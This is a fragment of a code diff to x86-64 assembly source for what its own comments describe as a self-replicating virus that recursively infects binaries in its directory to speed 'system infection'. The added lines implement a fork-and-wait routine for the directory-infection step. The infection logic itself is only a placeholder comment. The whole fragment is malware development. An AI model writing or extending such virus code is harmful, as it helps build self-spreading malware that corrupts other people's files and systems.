@@ -528,6 +528,31 @@ retn
 ;that infected binary will then infect recursively everything else from it's own directory (.) ownards
 ;this will make system infection faster
 handle_dir:
+	mov rax, 57
+	syscall; rax = fork()
+	cmp rax, 0
+	jne hd_parent
+	;infect directory here
+	jmp exit_prog
+	hd_parent:
+	push rdi
+	push rsi
+	push rdx
+	push r10
+	push rcx
+	;wait for child
+	mov rdi, rax; pid
+	mov rax, 61; sys_wait4
+	mov rsi, 0
+	mov rdx, 0
+	mov r10, 0
+	syscall; wait4(pid, NULL, 0, NULL); we wait for child to finish
+	;pop and return
+	pop rcx
+	pop r10
+	pop rdx
+	pop rsi
+	pop rdi
 
 retn
 
